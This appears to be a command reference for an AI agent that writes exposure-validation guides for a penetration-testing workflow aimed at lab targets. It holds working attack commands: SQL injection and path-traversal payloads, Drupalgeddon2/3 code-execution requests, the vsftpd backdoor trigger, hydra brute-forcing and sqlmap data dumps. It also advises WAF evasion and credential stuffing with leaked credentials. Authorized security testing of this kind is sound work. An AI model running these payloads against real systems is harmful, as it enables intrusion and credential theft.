# Validation Tools — Command Reference & Result Interpretation

This reference provides tool command templates and result interpretation guidance for CTEM Phase 4 validation operations. VGM should consult this when generating step-by-step validation guides.

## General Principles

1. **Target-specific commands**: Always fill in the target IP/hostname from the Scoping Summary. Never use placeholder IPs in commands presented to the user.
2. **Targeted over broad**: Use specific scripts, templates, or parameters rather than broad scans. Validation is about confirming specific exposures, not discovering new ones (though exploratory tasks may find new issues).
3. **Output readability**: Prefer verbose/readable output flags over raw/machine formats for user interpretation.
4. **No automated scanners**: Do not recommend Nessus, OpenVAS, or similar fully automated scanners. Use targeted manual tools.

---

## 1. curl / wget — Web PoC Validation

### Path Traversal / LFI

```bash
# Basic path traversal (CVE-2021-41773 example)
curl -s --path-as-is "http://<target>/icons/.%2e/%2e%2e/%2e%2e/etc/passwd"

# LFI with null byte (legacy PHP)
curl -s "http://<target>/page.php?file=../../../etc/passwd%00"

# LFI with PHP wrappers
curl -s "http://<target>/page.php?file=php://filter/convert.base64-encode/resource=config.php"

# Directory traversal with encoding variations
curl -s "http://<target>/..%252f..%252f..%252fetc/passwd"
```

**Result interpretation:**
- `confirmed`: Response contains `/root:x:0:0:` or other valid passwd entries / file content.
- `false-positive`: Response is 403 Forbidden, 404 Not Found, or generic error page with no file content.
- `inconclusive`: Response is empty, connection timeout, or ambiguous content.

### SQL Injection (manual probe)

```bash
# Error-based detection
curl -s "http://<target>/search?q=1'" 
curl -s "http://<target>/search?q=1' OR '1'='1"
curl -s "http://<target>/search?q=1' UNION SELECT NULL--"

# Time-based blind detection
curl -s "http://<target>/search?q=1' AND SLEEP(5)--" -w "\nTime: %{time_total}s\n"

# POST parameter injection
curl -s -X POST "http://<target>/login" -d "username=admin'--&password=test"
```

**Result interpretation:**
- `confirmed`: SQL error message returned (e.g., "You have an error in your SQL syntax"), UNION query returns data, or time-based delay is observed (>5s vs normal <1s).
- `false-positive`: Input is sanitized (no error, no behavior change, same response for all payloads).
- `inconclusive`: WAF blocks the request (403/406) — the vulnerability may exist behind the WAF.

### Default Credentials / Login Testing

```bash
# Test common default credentials
curl -s -X POST "http://<target>/login" \
  -d "username=admin&password=admin" \
  -c cookies.txt -L -v 2>&1 | head -50

# Check for authentication bypass
curl -s "http://<target>/admin" -H "Authorization: Basic YWRtaW46YWRtaW4="
```

**Result interpretation:**
- `confirmed`: Response includes dashboard content, session cookie set, redirect to admin panel.
- `false-positive`: Response is "Invalid credentials", remains on login page, no session cookie.
- `inconclusive`: Account lockout triggered, CAPTCHA presented.

### HTTP Header / Information Disclosure

```bash
# Check response headers
curl -sI "http://<target>/"

# Check for sensitive endpoints
curl -s "http://<target>/robots.txt"
curl -s "http://<target>/.env"
curl -s "http://<target>/wp-config.php.bak"
```

---

## 2. nmap NSE — Targeted Script Validation

### Specific CVE Verification

```bash
# Run a specific NSE script for a known vulnerability
nmap -p <port> --script <script-name> <target>

# Example: CVE-specific scripts
nmap -p 443 --script ssl-heartbleed <target>
nmap -p 80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi <target>
nmap -p 445 --script smb-vuln-ms17-010 <target>

# Service-specific deep scans
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst <target>
nmap -p 22 --script ssh2-enum-algos <target>
nmap -p 25 --script smtp-open-relay <target>
```

**Result interpretation:**
- `confirmed`: Script output reports "VULNERABLE", "State: VULNERABLE", or equivalent positive finding.
- `false-positive`: Script output reports "NOT VULNERABLE", "State: NOT VULNERABLE", or no finding.
- `inconclusive`: Script timeout, filtered port, or ambiguous output.

### Service Version Confirmation

```bash
# Detailed service version detection
nmap -sV -p <port> --version-intensity 9 <target>
```

---

## 3. Nuclei — PoC Mode Validation

### Single Template Execution

```bash
# Run a specific template against the target
nuclei -u http://<target> -t <template-path> -v

# Run by CVE ID
nuclei -u http://<target> -tags cve-2021-41773 -v

# Run by template ID
nuclei -u http://<target> -id apache-path-traversal -v

# Specific severity level
nuclei -u http://<target> -severity critical,high -v
```

**Result interpretation:**
- `confirmed`: Nuclei reports `[matched]` or `[vuln]` with the specific template.
- `false-positive`: No matches found, or template explicitly reports not vulnerable.
- `inconclusive`: Connection errors, rate limiting, or WAF interference.

### Web-Specific Templates

```bash
# Default credential checks
nuclei -u http://<target> -tags default-login -v

# Technology-specific
nuclei -u http://<target> -tags wordpress,joomla,drupal -v

# Misconfiguration checks
nuclei -u http://<target> -tags misconfig -v
```

---

## 4. gobuster / dirb / feroxbuster — Directory & File Enumeration

### Directory Enumeration

```bash
# gobuster directory mode
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster_results.txt

# With specific extensions
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 50

# dirb (simpler, recursive by default)
dirb http://<target> /usr/share/wordlists/dirb/common.txt

# feroxbuster (fast, recursive)
feroxbuster -u http://<target> -w /usr/share/wordlists/dirb/common.txt --depth 2
```

**Result interpretation:**
- Focus on status codes: 200 (found), 301/302 (redirect — likely exists), 403 (forbidden — exists but restricted).
- Note discovered paths that may host login panels, admin interfaces, backup files, or API endpoints.
- Discovered paths become input for further injection testing tasks in the VTT.

### VHOST / Subdomain Enumeration

```bash
gobuster vhost -u http://<target> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

## 5. hydra / medusa — Credential Testing

### SSH Brute-Force / Default Credential Testing

```bash
# Test common credentials
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4 -V

# Test specific username/password pairs
hydra -L users.txt -P passwords.txt ssh://<target> -t 4 -V

# Limited attempts (to avoid lockout)
hydra -l admin -P /usr/share/wordlists/top-100.txt ssh://<target> -t 2 -V -f
```

### Web Login Brute-Force

```bash
# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 10 -V

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/top-100.txt <target> http-get /admin -V
```

### FTP Credential Testing

```bash
hydra -l anonymous -p anonymous ftp://<target>
hydra -L users.txt -P passwords.txt ftp://<target> -t 4 -V
```

**Result interpretation (all hydra):**
- `confirmed`: hydra reports `[<port>][<service>] host: <target>   login: <user>   password: <pass>`.
- `false-positive`: All attempts fail, `0 valid passwords found`.
- `inconclusive`: Account lockout, connection drops, rate limiting.

**Important**: Use minimal wordlists and low thread counts to avoid denial-of-service. Credential testing is for validation, not exhaustive brute-force.

---

## 6. sqlmap — SQL Injection Validation

### Basic SQLi Confirmation

```bash
# Test a specific parameter
sqlmap -u "http://<target>/search?q=test" --batch --level 1 --risk 1

# Test POST parameters
sqlmap -u "http://<target>/login" --data "username=admin&password=test" --batch --level 1

# Test with specific technique
sqlmap -u "http://<target>/search?q=test" --technique=BEU --batch
```

### Data Extraction (after confirming SQLi)

```bash
# List databases
sqlmap -u "http://<target>/search?q=test" --dbs --batch

# List tables
sqlmap -u "http://<target>/search?q=test" -D <database> --tables --batch

# Dump specific table
sqlmap -u "http://<target>/search?q=test" -D <database> -T <table> --dump --batch
```

**Result interpretation:**
- `confirmed`: sqlmap reports "Parameter '<param>' is vulnerable" with injection type detail.
- `false-positive`: sqlmap reports "all tested parameters do not appear to be injectable".
- `inconclusive`: WAF detected, connection issues, or sqlmap suggests higher risk/level testing.

**Important**: Start with `--level 1 --risk 1` to minimize noise. Only escalate if initial tests are inconclusive.

---

## 7. Manual / Interactive Validation

### Telnet / Netcat — Service Interaction

```bash
# Banner grabbing
nc -nv <target> <port>

# FTP manual interaction
nc -nv <target> 21
# Then type: USER anonymous / PASS anonymous / LIST / etc.

# SMTP interaction
nc -nv <target> 25
# Then type: HELO test / VRFY admin / MAIL FROM:<test@test.com> / etc.
```

### OpenSSL — TLS/SSL Testing

```bash
# Check SSL/TLS versions
openssl s_client -connect <target>:443 -tls1
openssl s_client -connect <target>:443 -tls1_1

# Check specific cipher
openssl s_client -connect <target>:443 -cipher 'RC4-SHA'

# Full cipher enumeration
nmap -p 443 --script ssl-enum-ciphers <target>
```

### SMB — Share Enumeration

```bash
# List shares (null session)
smbclient -L //<target> -N

# Access a specific share
smbclient //<target>/<share> -N

# Enumerate with enum4linux
enum4linux -a <target>
```

---

## 8. FTP — Interactive Validation

FTP services on vulnerable hosts (e.g., Metasploitable 2) often allow anonymous access, writable directories, or backdoor triggers. This section covers manual FTP validation beyond what hydra/nmap detects.

### Anonymous Login & Directory Access

```bash
# Test anonymous login with ftp client
ftp <target>
# At prompt: Name: anonymous / Password: (blank or anonymous)

# Alternative: lftp for scripted access
lftp -u anonymous, <target> -e "ls; quit"

# List files recursively (after login)
ftp> ls -la
ftp> cd /tmp
ftp> ls
```

**Result interpretation:**
- `confirmed`: Login succeeds ("230 Login successful"), directory listing visible.
- `false-positive`: Login rejected ("530 Login incorrect").
- `inconclusive`: Connection timeout or "421 Service not available".

### Writable Directory Verification

```bash
# After successful anonymous login, test write access
ftp> put /tmp/test.txt test_upload.txt

# Alternative with curl
curl -T /tmp/test.txt ftp://<target>/test_upload.txt --user anonymous:

# Verify upload succeeded
curl ftp://<target>/ --user anonymous: | grep test_upload
```

**Result interpretation:**
- `confirmed`: Upload succeeds ("226 Transfer complete"), file appears in listing.
- `false-positive`: Upload denied ("550 Permission denied").
- `inconclusive`: Partial transfer or ambiguous error.

### FTP Backdoor Detection (vsftpd 2.3.4)

```bash
# vsftpd 2.3.4 backdoor trigger: username ending with :)
nc -nv <target> 21
# Type: USER backdoor:)
# Type: PASS anything
# Then check if port 6200 opened:
nc -nv <target> 6200
```

**Result interpretation:**
- `confirmed`: Port 6200 opens and provides shell access ("id" returns uid info).
- `false-positive`: Port 6200 remains closed, no response.
- `inconclusive`: Connection drops or unstable shell.

### Sensitive File Download

```bash
# After login, look for sensitive files
ftp> get /etc/passwd
ftp> get .htpasswd
ftp> get backup.sql

# With curl
curl ftp://<target>/etc/passwd --user anonymous:
```

**Result interpretation:**
- `confirmed`: File downloaded with sensitive content (credentials, configs).
- `false-positive`: "550 Failed to open file" or access denied.
- `inconclusive`: File exists but is empty or truncated.

---

## 9. Drupal CMS — Specific Validation

For Drupal-based targets (e.g., VulnHub DC-1), use these targeted validation techniques.

### Version Detection

```bash
# Check CHANGELOG.txt (common Drupal version disclosure)
curl -s "http://<target>/CHANGELOG.txt" | head -5

# Check meta generator tag
curl -s "http://<target>/" | grep -i "generator"

# Check install.php (sometimes accessible)
curl -s "http://<target>/install.php" | head -20

# Check core version via update.php or /core/CHANGELOG.txt (Drupal 8+)
curl -s "http://<target>/core/CHANGELOG.txt" | head -5
```

**Result interpretation:**
- Version identified: use version to look up known CVEs (Drupalgeddon, Drupalgeddon2, etc.).
- Access denied: site is hardened; use alternative detection methods.

### Drupalgeddon2 (CVE-2018-7600) Validation

```bash
# Test with curl — form API injection
curl -s "http://<target>/user/register" \
  -d "form_id=user_register_form" \
  -d "_drupal_ajax=1" \
  -d "mail[#post_render][]=exec" \
  -d "mail[#type]=markup" \
  -d "mail[#markup]=id" 2>&1 | grep uid

# Alternative: use Nuclei with Drupal-specific template
nuclei -u http://<target> -tags cve-2018-7600 -v

# Alternative: nmap script
nmap -p 80 --script http-vuln-cve2018-7600 <target>
```

**Result interpretation:**
- `confirmed`: Response contains command output (e.g., "uid=33(www-data)").
- `false-positive`: 403 Forbidden, form validation error, or no output.
- `inconclusive`: WAF interference or ambiguous response.

### Drupalgeddon3 (CVE-2018-7602) Validation

```bash
# Requires authenticated session (admin credentials needed)
# Step 1: Login and get session cookie
curl -s -c cookies.txt -X POST "http://<target>/user/login" \
  -d "name=admin&pass=admin&form_id=user_login&op=Log+in"

# Step 2: Exploit via cancel form
curl -s -b cookies.txt "http://<target>/user/1/cancel?destination=user/1?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]=id"
```

**Result interpretation:**
- `confirmed`: Command output visible in response.
- `false-positive`: Redirect to access denied or no injection output.
- `inconclusive`: Credentials unavailable for authenticated test.

### Drupal Module & Endpoint Enumeration

```bash
# Common interesting paths
curl -s "http://<target>/admin" -o /dev/null -w "%{http_code}"
curl -s "http://<target>/node/1"
curl -s "http://<target>/?q=admin/modules"
curl -s "http://<target>/?q=filter/tips"

# Use gobuster with Drupal-specific wordlist
gobuster dir -u http://<target> -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/drupal.txt -t 30

# Check for views module (SQL injection surface)
curl -s "http://<target>/?q=admin/views"
```

**Result interpretation:**
- Focus on 200 status codes revealing admin interfaces, module lists, or user-accessible content.
- Note any exposed modules that have known vulnerabilities.
- Discovered endpoints feed into further injection or authentication testing tasks.

---

## 10. smbmap — SMB Permission Mapping

Complement smbclient/enum4linux with smbmap for clearer permission visualization.

```bash
# List shares with permissions (null session)
smbmap -H <target>

# List shares with credentials
smbmap -H <target> -u <user> -p <password>

# Recursive file listing on a share
smbmap -H <target> -R <share>

# Download a specific file
smbmap -H <target> -R <share> -A <filename> -q

# Check for writable shares
smbmap -H <target> | grep -i "WRITE\|READ, WRITE"
```

**Result interpretation:**
- `confirmed` (for anonymous/unauthorized access): Shares listed with READ or WRITE permissions without credentials.
- `false-positive`: "Authentication error" or all shares show NO ACCESS.
- `inconclusive`: Connection timeout, SMB signing required but not configured.

**Comparison with other SMB tools:**

| Tool | Best For | Output Style |
|------|---------|-------------|
| smbmap | Permission overview, writable share detection | Clean table |
| smbclient | Interactive file access, manual browsing | FTP-like CLI |
| enum4linux | Full enumeration (users, groups, policies, shares) | Verbose text dump |

---

## 11. Evidence Documentation Standard

Every validation attempt MUST record the following evidence for traceability (supports RQ1 field-write verification and Chapter 4 data collection).

### Required Fields Per Validation Attempt

| Field | Description | Example |
|-------|------------|--------|
| **Timestamp** | ISO 8601 date/time of execution | `2026-05-17T14:30:00+08:00` |
| **Exposure ID** | The exposure being validated | `EXP-003` |
| **Command** | Exact command executed | `hydra -l anonymous -p anonymous ftp://192.168.56.101` |
| **Tool Version** | Tool name and version | `hydra 9.5` |
| **Key Output** | Critical lines from output (truncate verbose output) | `[21][ftp] host: 192.168.56.101 login: anonymous password: anonymous` |
| **Judgment** | confirmed / false-positive / inconclusive | `confirmed` |
| **Rationale** | One-sentence explanation of judgment basis | `Anonymous FTP login succeeded, directory listing returned 15 files` |

### Evidence Recording Format

When presenting validation results to the user or writing to VTT:

```markdown
#### EXP-003: FTP Anonymous Login
- **Time**: 2026-05-17T14:30:00+08:00
- **Command**: `hydra -l anonymous -p anonymous ftp://192.168.56.101`
- **Key Output**:
  ```
  [21][ftp] host: 192.168.56.101   login: anonymous   password: anonymous
  1 of 1 target successfully completed, 1 valid password found
  ```
- **Judgment**: confirmed
- **Rationale**: Anonymous FTP login succeeded; hydra reported valid credentials.
```

### Evidence Completeness Checklist

Before marking any exposure's Validation Status:

- [ ] At least one command was executed against the target
- [ ] Output was captured (not just described from memory)
- [ ] Judgment aligns with the Result Interpretation criteria in this document
- [ ] If `inconclusive`: alternative approach was suggested or attempted
- [ ] If `NEW FINDING`: full classification fields provided (Type, Raw Severity, Affected Service)

---

## Result Interpretation Summary

| Outcome | Evidence Type | Action |
|---------|-------------|--------|
| **confirmed** | Successful exploitation output, data returned, access achieved | Mark exposure confirmed in VTT |
| **false-positive** | Explicit denial, patched version, no vulnerability indicators | Mark exposure false-positive in VTT |
| **inconclusive** | Timeout, WAF block, ambiguous output, partial result | Mark inconclusive, suggest alternative approaches or retry |
| **NEW FINDING** | Unexpected data, new service, credentials found, injection point | Flag for VPM NEW FINDING classification |

### Alternative Approaches for Inconclusive Results

When a validation attempt is inconclusive, suggest alternatives:

| Obstacle | Alternative Approach |
|----------|---------------------|
| WAF blocking | Try encoding variations, different HTTP methods, or alternative payloads |
| Connection timeout | Try from different network position, reduce parallelism, use slower scan timing |
| Rate limiting | Reduce request frequency, use time-delay between attempts |
| Account lockout | Stop brute-force, try credential stuffing with known leaked credentials instead |
| Partial output | Try more verbose flags, redirect output to file, use different output format |
